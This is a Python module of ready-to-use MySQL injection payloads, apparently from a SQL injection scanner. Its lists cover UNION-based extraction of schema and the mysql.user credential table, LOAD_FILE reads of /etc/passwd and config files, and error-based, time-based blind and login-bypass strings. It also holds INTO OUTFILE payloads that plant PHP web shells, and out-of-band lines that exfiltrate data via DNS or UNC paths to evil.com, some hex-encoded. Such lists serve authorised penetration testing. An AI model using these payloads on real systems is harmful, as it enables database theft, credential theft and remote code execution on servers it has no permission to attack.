"""mysql.py — MySQL-Specific Injection Payloads"""

MYSQL_PAYLOADS: list[str] = [
    # Version/info extraction
    "' UNION SELECT @@version,NULL--",
    "' UNION SELECT @@version,2,3--",
    "' UNION SELECT user(),database(),version()--",
    "' UNION SELECT @@datadir,@@basedir,NULL--",
    "' UNION SELECT @@global.secure_file_priv,NULL,NULL--",
    # Information schema
    "' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables LIMIT 10--",
    "' UNION SELECT column_name,table_name,NULL FROM information_schema.columns LIMIT 10--",
    "' UNION SELECT user,password,host FROM mysql.user LIMIT 5--",
    # File read
    "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
    "' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--",
    "' UNION SELECT LOAD_FILE('C:\\\\Windows\\\\win.ini'),NULL,NULL--",
    # File write
    "' UNION SELECT '<?php system($_GET[\"cmd\"]);?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--",
    # Error-based
    "' AND extractvalue(1,concat(0x7e,@@version))--",
    "' AND updatexml(NULL,concat(0x7e,@@version),NULL)--",
    "' AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,0x3a,@@version,0x3a,0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXP(~(SELECT * FROM(SELECT user())a))--",
    "' AND EXTRACTVALUE(0,concat(0,user()))--",
    # Authentication bypass
    "admin'-- -",
    "' OR 1=1-- -",
    "' OR '1'='1'-- -",
    "') OR ('1'='1'-- -",
    # Group by injection
    "' GROUP BY 1--",
    "' GROUP BY 2--",
    "' GROUP BY 3--",
    "' GROUP BY 4--",
    # Conditional
    "' AND (SELECT 1 WHERE 1=1)--",
    "' AND (SELECT 1 WHERE 1=2)--",
    # String functions
    "' UNION SELECT SUBSTR(user(),1,1),NULL,NULL--",
    "' UNION SELECT ASCII(SUBSTR(user(),1,1)),NULL,NULL--",
    "' UNION SELECT MID(user(),1,5),NULL,NULL--",
    "' UNION SELECT LENGTH(database()),NULL,NULL--",
]

MYSQL_BLIND_TIME: list[str] = [
    "' AND SLEEP(5)--",
    "' AND SLEEP(5)#",
    "' OR SLEEP(5)--",
    "1 AND SLEEP(5)--",
    "1) AND SLEEP(5)--",
    "') AND SLEEP(5)--",
    "'; SLEEP(5)--",
    "' AND SLEEP(5) AND '1'='1",
    "' AND IF(1=1,SLEEP(5),0)--",
    "' AND IF(1=2,SLEEP(5),0)--",
    "' AND BENCHMARK(10000000,MD5('test'))--",
    "1 OR SLEEP(5)--",
    "'; SELECT SLEEP(5)--",
    # Conditional time-based
    "' AND IF(1=1,SLEEP(5),SLEEP(0))--",
    "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",
    "' AND IF(user()='root',SLEEP(5),0)--",
    # Fast (baseline)
    "' AND SLEEP(0)--",
    "1 AND SLEEP(0)--",
]

MYSQL_OOB: list[str] = [
    # DNS OOB via LOAD_FILE
    "' AND LOAD_FILE(concat('\\\\\\\\',user(),'.evil.com\\\\a'))--",
    "' AND LOAD_FILE(concat(0x5c5c5c5c,user(),0x2e,0x6576696c2e636f6d,0x5c5c612e747874))--",
    # UNC path (Windows MySQL)
    "'; SELECT LOAD_FILE('\\\\\\\\evil.com\\\\payload')--",
    # OUT FILE to web root
    "'; SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--",
    "'; SELECT '<?php echo shell_exec($_GET[\"e\"]);?>' INTO OUTFILE '/var/www/html/cmd.php'--",
]
